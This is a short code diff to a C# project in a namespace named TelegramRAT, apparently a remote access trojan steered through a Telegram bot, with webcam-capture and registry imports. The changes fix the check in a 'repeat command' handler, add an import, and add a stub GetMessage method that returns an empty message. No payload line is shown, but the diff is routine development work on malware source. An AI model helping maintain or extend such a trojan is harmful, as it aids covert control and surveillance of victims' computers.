@@ -20,6 +20,7 @@ using Microsoft.Win32;
 using AForge;
 using AForge.Video;
 using AForge.Video.DirectShow;
+using Telegram.Bot.Requests;
 
 
 
@@ -1752,13 +1753,13 @@ namespace TelegramRAT
 
                 Execute = model =>
                 {
-                    if (model.Message != null)
+                    if (model.Message.ReplyToMessage == null)
                     {
                         Bot.SendTextMessageAsync(model.Message.Chat.Id, "Reply to message", replyToMessageId: model.Message.MessageId);
                         return;
                     }
                     BotCommandModel newmodel = BotCommandModel.FromMessage(model.Message.ReplyToMessage);
-
+                    
                     if (newmodel == null)
                     {
                         Bot.SendTextMessageAsync(model.Message.Chat.Id, "Unable to repeat command from this message");
@@ -1775,5 +1776,11 @@ namespace TelegramRAT
             });
 
         }
+
+        public static Message GetMessage(this TelegramBotClient botClient)
+        {
+            return new Message();
+        }
+
     }
 }
